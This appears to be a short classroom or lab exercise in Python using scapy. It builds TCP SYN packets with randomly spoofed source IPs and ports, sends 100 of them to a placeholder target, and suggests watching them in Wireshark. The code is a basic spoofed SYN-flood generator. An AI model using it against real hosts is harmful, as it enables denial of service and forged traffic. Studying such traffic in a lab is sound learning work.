from scapy.all import *
import random

# Task 1: Successfully create syn packet

# Create a basic SYN packet
syn_packet = IP(dst="localhost") / TCP(dport=12345, flags="S")

# Display the packet details
print(syn_packet.summary())

# Task 2: Randomly generate IP address and port number for each packet

def random_ip():
    return ".".join(str(random.randint(1, 255)) for _ in range(4))

def random_port():
    return random.randint(1024, 65535)

# Task 3: Generate as many packets as desired

num_packets = 100  # Specify the number of packets to send

for _ in range(num_packets):
    src_ip = random_ip()
    src_port = random_port()
    syn_packet = IP(src=src_ip, dst="TARGET_IP") / TCP(sport=src_port, dport=TARGET_PORT, flags="S")
    send(syn_packet)

# Task 4: Use Wireshark to track the packets

# Run Wireshark alongside your program to observe the SYN packets being sent.
